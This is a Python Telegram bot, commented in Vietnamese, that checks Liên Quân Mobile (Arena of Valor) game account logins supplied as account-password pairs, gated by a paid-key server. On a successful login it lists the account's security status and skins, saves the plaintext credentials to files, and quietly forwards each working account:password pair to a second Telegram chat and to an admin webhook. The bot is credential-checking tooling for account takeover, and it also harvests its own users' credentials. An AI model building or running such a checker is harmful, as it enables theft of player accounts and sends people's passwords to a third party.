#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram Bot - Check Liên Quân Mobile
Hỗ trợ chọn backend: api / goc / main / nhanh
Hiện danh sách skin text + gửi ảnh lưới skin
"""

import os
import asyncio
import logging
import importlib
from datetime import datetime
from pathlib import Path
from io import BytesIO

try:
    from telegram import Update, InputFile
    from telegram.ext import Application, CommandHandler, ContextTypes, ConversationHandler, MessageHandler, filters
except ImportError:
    print("pip install python-telegram-bot")
    raise

try:
    from PIL import Image, ImageDraw, ImageFont
    import requests
except ImportError:
    Image = None
    requests = None

# ── Cấu hình ────────────────────────────────────────────────────────────────
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "ĐIỀN_TOKEN_BOT_VÀO_ĐÂY")
# Chat Telegram thứ 2 (tuỳ chọn)
SECOND_BOT_CHAT_ID = os.getenv("SECOND_BOT_CHAT_ID", "")
# URL admin web nhận hit (webhook)
ADMIN_WEB_URL = os.getenv("ADMIN_WEB_URL", "")  # VD: https://yourdomain.com/api/hit
HITS_DIR = Path("hits")
HITS_DIR.mkdir(exist_ok=True)

CURRENT_BACKEND = "goc"
BACKENDS = {
    "api": "api",
    "goc": "goc",
    "main": "main",
    "nhanh": "nhanh",
}

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

_check_fn = None
_current_module = None


def load_backend(name: str):
    global _check_fn, _current_module
    if name not in BACKENDS:
        raise ValueError(f"Backend không hợp lệ: {name}")
    module_name = BACKENDS[name]
    try:
        if module_name in importlib.sys.modules:
            mod = importlib.reload(importlib.sys.modules[module_name])
        else:
            mod = importlib.import_module(module_name)
        if not hasattr(mod, "check_login"):
            raise AttributeError(f"{module_name}.py không có hàm check_login")
        _check_fn = mod.check_login
        _current_module = mod
        logger.info(f"Đã load backend: {name}")
        return True
    except Exception as e:
        logger.error(f"Lỗi load {name}: {e}")
        raise


try:
    load_backend(CURRENT_BACKEND)
except Exception as e:
    print(f"Không load được backend mặc định ({CURRENT_BACKEND}): {e}")


def get_skin_db():
    """Lấy SKIN_DB từ module hiện tại, nếu không có thì thử load từ nhanh/main."""
    if _current_module and hasattr(_current_module, "SKIN_DB"):
        return _current_module.SKIN_DB
    # Fallback: load từ nhanh hoặc main
    for name in ("nhanh", "main"):
        try:
            mod = importlib.import_module(name)
            if hasattr(mod, "SKIN_DB"):
                return mod.SKIN_DB
        except Exception:
            continue
    return {}


import unicodedata
import re

def normalize_name(s: str) -> str:
    """Chuẩn hóa tên skin để match tốt hơn (bỏ dấu, lowercase, bỏ ký tự đặc biệt)."""
    if not s:
        return ""
    s = unicodedata.normalize("NFD", s)
    s = "".join(c for c in s if unicodedata.category(c) != "Mn")
    s = s.lower()
    s = re.sub(r"[^a-z0-9\s]", " ", s)
    s = re.sub(r"\s+", " ", s).strip()
    return s


def build_name_to_info():
    """Tạo map tên skin (cả original + normalized) -> info."""
    db = get_skin_db()
    mapping = {}
    norm_mapping = {}
    for sid, info in db.items():
        if not info:
            continue
        name = info.get("name")
        img = info.get("img")
        if name and img:
            data = {
                "img": img,
                "grade": info.get("grade") or "",
                "hero": info.get("hero") or "",
                "label_text": info.get("label_text") or "",
                "original_name": name,
            }
            mapping[name] = data
            nname = normalize_name(name)
            if nname and nname not in norm_mapping:
                norm_mapping[nname] = data
    # Gắn thêm norm map vào mapping để dễ dùng
    mapping["__norm__"] = norm_mapping
    return mapping


def format_skin_lists(skins: dict) -> list:
    """Tạo danh sách text các nhóm skin (hiện đầy đủ, không cắt)."""
    lines = []
    categories = [
        ("sss_list", "SSS"),
        ("ss_list", "SS"),
        ("s_plus_list", "S+"),
        ("anime_list", "Anime"),
        ("other_list", "Khác"),
    ]
    for key, label in categories:
        lst = skins.get(key) or []
        if lst:
            text = ", ".join(lst)
            lines.append(f"   {label} ({len(lst)}): {text}")
    return lines


def get_skin_info(name: str, name_to_info: dict):
    """Lấy info skin, ưu tiên exact rồi đến normalized."""
    if not name or not name_to_info:
        return None
    if name in name_to_info and name != "__norm__":
        return name_to_info[name]
    nname = normalize_name(name)
    norm_map = name_to_info.get("__norm__", {})
    return norm_map.get(nname)


def create_skin_grid(skin_names: list, name_to_info: dict, max_skins: int = 70) -> BytesIO | None:
    """Tạo ảnh lưới skin đẹp hơn, gần giống ảnh mẫu, ưu tiên bậc cao, match tên tốt hơn."""
    if not Image or not requests or not skin_names:
        return None

    # Ưu tiên skin cao cấp
    priority = {"SSS": 0, "SS": 1, "S+": 2, "S": 3, "A": 8}
    def sort_key(n):
        info = get_skin_info(n, name_to_info) or {}
        g = (info.get("grade") or "").upper()
        return (priority.get(g, 20), n)

    sorted_names = sorted(set(skin_names), key=sort_key)  # unique + sort

    items = []
    for name in sorted_names[:max_skins]:
        info = get_skin_info(name, name_to_info)
        if info and info.get("img"):
            items.append((name, info))

    if not items:
        return None

    def dl(url):
        try:
            r = requests.get(url, timeout=12, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                return Image.open(BytesIO(r.content)).convert("RGB")
        except Exception:
            pass
        return None

    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=12) as ex:
        imgs = list(ex.map(lambda x: dl(x[1]["img"]), items))

    valid = [(name, info, img) for (name, info), img in zip(items, imgs) if img]
    if not valid:
        return None

    # Layout dày hơn, giống ảnh mẫu hơn
    cols = 7 if len(valid) > 20 else 6
    thumb = 120
    pad = 6
    label_h = 32
    cell_w = thumb + pad
    cell_h = thumb + label_h + pad
    rows = (len(valid) + cols - 1) // cols

    W = cols * cell_w + pad * 2
    H = rows * cell_h + pad * 2 + 36

    # Nền xanh đậm
    canvas = Image.new("RGB", (W, H), (18, 32, 78))
    draw = ImageDraw.Draw(canvas)

    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
        font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 8)
        font_title = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
    except Exception:
        font = ImageFont.load_default()
        font_small = font
        font_title = font

    draw.text((10, 8), f"Skins ({len(valid)}/{len(set(skin_names))})", fill=(210, 220, 255), font=font_title)

    grade_colors = {
        "SSS": (255, 70, 70),
        "SS": (255, 130, 30),
        "S+": (255, 190, 50),
        "S": (170, 100, 255),
        "A": (90, 170, 255),
    }

    for i, (name, info, img) in enumerate(valid):
        r, c = divmod(i, cols)
        x = pad + c * cell_w
        y = 32 + pad + r * cell_h

        # Card
        draw.rectangle([x, y, x + thumb, y + thumb + label_h - 2], fill=(28, 48, 95), outline=(70, 110, 190), width=1)

        # Image
        img.thumbnail((thumb - 6, thumb - 6), Image.LANCZOS)
        ix = x + (thumb - img.width) // 2
        iy = y + 3 + (thumb - 6 - img.height) // 2
        canvas.paste(img, (ix, iy))

        # Badge
        grade = (info.get("grade") or "").upper()
        if grade:
            bc = grade_colors.get(grade, (140, 140, 160))
            bx, by = x + 3, y + 3
            draw.rectangle([bx, by, bx + 32, by + 16], fill=bc)
            draw.text((bx + 3, by + 2), grade, fill=(15, 15, 25), font=font_small)

        # Name
        hero = info.get("hero") or ""
        disp = name
        if hero and hero.lower() not in name.lower():
            disp = f"{hero} {name}"
        short = disp[:20]
        draw.text((x + 3, y + thumb + 2), short, fill=(225, 230, 250), font=font)

    bio = BytesIO()
    canvas.save(bio, format="PNG", optimize=True)
    bio.seek(0)
    return bio


def format_result(r: dict) -> str:
    status = r.get("status", "UNKNOWN")
    acc = r.get("account", "")
    pw = r.get("password", "")

    if status != "HIT":
        detail = r.get("detail", "")
        return (
            f"<b>{status}</b>\n"
            f"Acc: <code>{acc}</code>\n"
            f"Chi tiet: {detail or 'Khong ro'}"
        )

    uid = r.get("uid", "")
    nick = r.get("nickname") or r.get("aov_name") or "-"
    country = r.get("country") or r.get("region") or "-"
    shells = r.get("shells", 0)

    phone = "YES" if r.get("mobile_bound") else "NO"
    if r.get("aov_prefill_mobile") or r.get("masked_phone"):
        phone = f"YES [{r.get('aov_prefill_mobile') or r.get('masked_phone')}]"
    email = "YES" if r.get("email_verified") or r.get("email_v") else "NO"
    if r.get("masked_email"):
        email = f"YES [{r.get('masked_email')}]"
    fb = "YES" if r.get("fb_linked") else "NO"
    twofa = "YES" if r.get("twofa") or r.get("auth_bound") else "NO"
    ban = "YES" if r.get("ban") or r.get("is_banned") else "NO"

    skins = r.get("aov_skins") or {}
    total = skins.get("total_skins", 0)
    ss = skins.get("ss", 0)
    sss = skins.get("sss", 0)
    s_plus = skins.get("s_plus", 0)
    anime = skins.get("anime", 0)
    other = skins.get("other", 0)
    tinh = r.get("tinh_trang") or "Chưa rõ"

    lines = [
        "<b>SUCCESS</b>",
        f"Acc: <code>{acc}:{pw}</code>",
        f"UID: <code>{uid}</code>",
        f"Nickname: {nick}",
        f"Country: {country}",
        f"SDT: {phone}",
        f"Mail: {email}",
        f"Facebook: {fb}",
        f"2FA: {twofa}",
        f"Ban: {ban}",
        f"Shells: {shells}",
        f"Skins: {total} (SSS:{sss} SS:{ss} S+:{s_plus} Anime:{anime} Khac:{other})",
    ]

    # Danh sách skin chi tiết
    skin_lines = format_skin_lists(skins)
    if skin_lines:
        lines.append("")
        lines.append("<b>Danh sach skin:</b>")
        lines.extend(skin_lines)

    lines.append(f"\nTinh trang: {tinh}")
    lines.append(f"Backend: <code>{CURRENT_BACKEND}</code>")
    return "\n".join(lines)


def collect_all_skin_names(skins: dict) -> list:
    names = []
    for key in ("sss_list", "ss_list", "s_plus_list", "anime_list", "other_list"):
        names.extend(skins.get(key) or [])
    return names


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>ASEAN MISSYOU</b>\n\n"
        "Lenh:\n"
        "• <code>/checklq tk-mk</code>\n"
        "• <code>/backend api|goc|main|nhanh</code>\n"
        "• <code>/cancel</code> — hủy thao tác\n\n"
        f"Backend dang dung: <code>{CURRENT_BACKEND}</code>"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>Huong dan</b>\n\n"
        "• <code>/checklq</code> — bắt đầu check (bot sẽ hỏi key)\n"
        "• <code>/backend goc|main|nhanh|api</code>\n"
        "• <code>/cancel</code> — hủy\n\n"
        "Ket qua se hien danh sach skin + anh luoi (neu backend co SKIN_DB)."
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def backend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CURRENT_BACKEND
    if not context.args:
        await update.message.reply_text(
            f"Backend hien tai: <code>{CURRENT_BACKEND}</code>\n\n"
            "Đổi bằng: <code>/backend api|goc|main|nhanh</code>",
            parse_mode="HTML",
        )
        return

    name = context.args[0].lower().strip()
    if name not in BACKENDS:
        await update.message.reply_text(
            "Backend không hợp lệ.\nChọn: <code>api</code>, <code>goc</code>, <code>main</code>, <code>nhanh</code>",
            parse_mode="HTML",
        )
        return

    try:
        load_backend(name)
        CURRENT_BACKEND = name
        await update.message.reply_text(
            f"Da chuyen sang backend: <code>{name}</code>",
            parse_mode="HTML",
        )
    except Exception as e:
        await update.message.reply_text(
            f"Khong load duoc <code>{name}</code>\n{e}",
            parse_mode="HTML",
        )


# ── Key Server ─────────────────────────────────────────────────────────────
KEY_SERVER = "https://qdonenliteseverkey.onrender.com"
KEY_VERIFY_URL = f"{KEY_SERVER}/api/verify"

# States for conversation
ASK_KEY, ASK_ACCOUNT = range(2)


def verify_key_sync(key: str) -> bool:
    """Kiểm tra key với server. Trả về True nếu hợp lệ."""
    if not key or not requests:
        return False
    key = key.strip()
    payloads = [
        {"key": key},
        {"license": key},
        {"code": key},
        {"api_key": key},
        {"token": key},
    ]
    for p in payloads:
        try:
            r = requests.post(KEY_VERIFY_URL, json=p, timeout=12)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict) and data.get("ok") is True:
                    return True
                # Một số server trả về success hoặc valid
                if data.get("success") or data.get("valid") or data.get("status") == "ok":
                    return True
        except Exception:
            continue
    return False


async def checklq_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bắt đầu flow check: yêu cầu nhập key."""
    await update.message.reply_text(
        "Vui lòng nhập key để check skin.",
        parse_mode="HTML",
    )
    return ASK_KEY


async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Nhận key từ user và xác thực."""
    key = (update.message.text or "").strip()
    if not key:
        await update.message.reply_text("Key không được để trống. Nhập lại:")
        return ASK_KEY

    await update.message.reply_text("Đang kiểm tra key...")

    loop = asyncio.get_event_loop()
    valid = await loop.run_in_executor(None, lambda: verify_key_sync(key))

    if not valid:
        await update.message.reply_text(
            "Key không hợp lệ hoặc đã hết hạn.\nVui lòng nhập key khác hoặc liên hệ admin."
        )
        return ASK_KEY

    # Lưu key vào user_data
    context.user_data["verified_key"] = key
    await update.message.reply_text(
        "Key hợp lệ.\n\n"
        "Bây giờ gửi tài khoản theo định dạng:\n"
        "<code>tài_khoản-mật_khẩu</code>\n"
        "Ví dụ: <code>user123-pass456</code>",
        parse_mode="HTML",
    )
    return ASK_ACCOUNT


async def receive_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Nhận account-pass sau khi key đã verify, rồi check."""
    raw = (update.message.text or "").strip()
    if "-" in raw:
        parts = raw.split("-", 1)
    else:
        parts = raw.split(maxsplit=1)

    if len(parts) < 2:
        await update.message.reply_text(
            "Sai định dạng.\nDùng: <code>tài_khoản-mật_khẩu</code>",
            parse_mode="HTML",
        )
        return ASK_ACCOUNT

    account = parts[0].strip()
    password = parts[1].strip()
    key = context.user_data.get("verified_key", "")

    msg = await update.message.reply_text(
        f"Đang check <code>{account}</code> (key: {key[:6]}...)",
        parse_mode="HTML",
    )

    loop = asyncio.get_event_loop()
    try:
        result = await loop.run_in_executor(
            None,
            lambda: _check_fn(account, password, fetch_info=True),
        )
    except Exception as e:
        result = {
            "status": "ERROR",
            "account": account,
            "password": password,
            "detail": str(e),
        }

    text = format_result(result)
    # Gắn key vào kết quả
    text = f"Key: <code>{key}</code>\n\n" + text
    await msg.edit_text(text, parse_mode="HTML")

    # Gửi ảnh lưới skin nếu có
    if result.get("status") == "HIT":
        skins = result.get("aov_skins") or {}
        all_names = collect_all_skin_names(skins)
        if all_names and Image:
            name_to_info = build_name_to_info()
            if name_to_info:
                try:
                    bio = await loop.run_in_executor(
                        None, lambda: create_skin_grid(all_names, name_to_info)
                    )
                    if bio:
                        await update.message.reply_photo(
                            photo=InputFile(bio, filename="skins.png"),
                            caption=f"Skin grid — {account} (key: {key[:6]}...)",
                        )
                except Exception as e:
                    logger.warning(f"Không gửi được ảnh skin: {e}")

    # Lưu HIT + gửi admin (gắn key)
    if result.get("status") == "HIT":
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = HITS_DIR / f"{account}_{ts}.txt"
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(f"KEY: {key}\n{account}:{password}\n")
                clean = text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                f.write(clean + "\n")
        except Exception as e:
            logger.warning(f"Không lưu hit: {e}")

        if ADMIN_WEB_URL and requests:
            try:
                payload = {
                    "key": key,
                    "account": account,
                    "password": password,
                    "uid": str(result.get("uid", "")),
                    "nickname": result.get("nickname") or result.get("aov_name") or "",
                    "country": result.get("country") or result.get("region") or "",
                    "shells": result.get("shells", 0),
                    "total_skins": (result.get("aov_skins") or {}).get("total_skins", 0),
                    "backend": CURRENT_BACKEND,
                    "full_text": text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", ""),
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                await loop.run_in_executor(
                    None,
                    lambda: requests.post(ADMIN_WEB_URL, json=payload, timeout=10),
                )
                logger.info(f"Da gui hit ve admin web: {account} (key={key[:6]})")
            except Exception as e:
                logger.warning(f"Khong gui duoc ve admin web: {e}")

    # Xóa key sau khi dùng (tuỳ chọn, hoặc giữ để dùng tiếp)
    # context.user_data.pop("verified_key", None)
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Đã hủy.")
    return ConversationHandler.END


async def checklq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check account trực tiếp, không cần key."""
    if _check_fn is None:
        await update.message.reply_text("Chua load duoc backend nao.")
        return

    if not context.args:
        await update.message.reply_text(
            "Sai cú pháp.\nDùng: <code>/checklq tài_khoản-mật_khẩu</code>",
            parse_mode="HTML",
        )
        return

    raw = " ".join(context.args).strip()
    if "-" in raw:
        parts = raw.split("-", 1)
    else:
        parts = raw.split(maxsplit=1)

    if len(parts) < 2:
        await update.message.reply_text(
            "Thiếu mật khẩu.\nVí dụ: <code>/checklq user-pass</code>",
            parse_mode="HTML",
        )
        return

    account = parts[0].strip()
    password = parts[1].strip()

    msg = await update.message.reply_text(
        f"Dang check <code>{account}</code> (backend: {CURRENT_BACKEND})...",
        parse_mode="HTML",
    )

    loop = asyncio.get_event_loop()
    try:
        result = await loop.run_in_executor(
            None,
            lambda: _check_fn(account, password, fetch_info=True),
        )
    except Exception as e:
        result = {
            "status": "ERROR",
            "account": account,
            "password": password,
            "detail": str(e),
        }

    text = format_result(result)
    await msg.edit_text(text, parse_mode="HTML")

    # Gửi ảnh lưới skin nếu có
    if result.get("status") == "HIT":
        skins = result.get("aov_skins") or {}
        all_names = collect_all_skin_names(skins)
        if all_names and Image:
            name_to_info = build_name_to_info()
            if name_to_info:
                try:
                    bio = await loop.run_in_executor(
                        None, lambda: create_skin_grid(all_names, name_to_info)
                    )
                    if bio:
                        await update.message.reply_photo(
                            photo=InputFile(bio, filename="skins.png"),
                            caption=f"Skin grid — {account} ({len(all_names)} skins)",
                        )
                except Exception as e:
                    logger.warning(f"Không gửi được ảnh skin: {e}")

    # Lưu HIT
    if result.get("status") == "HIT":
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = HITS_DIR / f"{account}_{ts}.txt"
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(f"{account}:{password}\n")
                clean = text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                f.write(clean + "\n")
        except Exception as e:
            logger.warning(f"Không lưu hit: {e}")

        if SECOND_BOT_CHAT_ID:
            try:
                await context.bot.send_message(chat_id=SECOND_BOT_CHAT_ID, text=f"{account}:{password}")
            except Exception:
                pass

        if ADMIN_WEB_URL and requests:
            try:
                payload = {
                    "account": account,
                    "password": password,
                    "uid": str(result.get("uid", "")),
                    "nickname": result.get("nickname") or result.get("aov_name") or "",
                    "country": result.get("country") or result.get("region") or "",
                    "shells": result.get("shells", 0),
                    "total_skins": (result.get("aov_skins") or {}).get("total_skins", 0),
                    "backend": CURRENT_BACKEND,
                    "full_text": text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", ""),
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                await loop.run_in_executor(None, lambda: requests.post(ADMIN_WEB_URL, json=payload, timeout=10))
            except Exception as e:
                logger.warning(f"Khong gui duoc ve admin web: {e}")


def main():
    if TOKEN == "ĐIỀN_TOKEN_BOT_VÀO_ĐÂY" or not TOKEN:
        print("ERROR: Điền TELEGRAM_BOT_TOKEN hoặc sửa biến TOKEN.")
        print("Trên Render: vào Environment Variables và set TELEGRAM_BOT_TOKEN.")
        # Vẫn chạy web server để không bị setup failed ngay
        from flask import Flask
        web = Flask(__name__)
        @web.route("/")
        def index():
            return "<h2>Bot chưa có TOKEN</h2><p>Set TELEGRAM_BOT_TOKEN trên Render.</p>", 200
        @web.route("/health")
        def health():
            return "ok", 200
        port = int(os.getenv("PORT", 10000))
        web.run(host="0.0.0.0", port=port, debug=False)
        return

    # Chạy web server đơn giản để Render nhận diện là Web Service
    from flask import Flask
    web = Flask(__name__)

    @web.route("/")
    def index():
        return "<h2>ASEAN MISSYOU</h2><p>Bot dang chay.</p>", 200

    @web.route("/health")
    def health():
        return "ok", 200

    port = int(os.getenv("PORT", 10000))
    import threading
    threading.Thread(
        target=lambda: web.run(host="0.0.0.0", port=port, debug=False, use_reloader=False),
        daemon=True,
    ).start()
    print(f"Web server chay tren port {port}")

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("backend", backend_cmd))
    app.add_handler(CommandHandler("checklq", checklq))

    print(f"Bot chay voi backend mac dinh: {CURRENT_BACKEND}")
    print("Lenh: /checklq tk-mk | /backend api|goc|main|nhanh")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
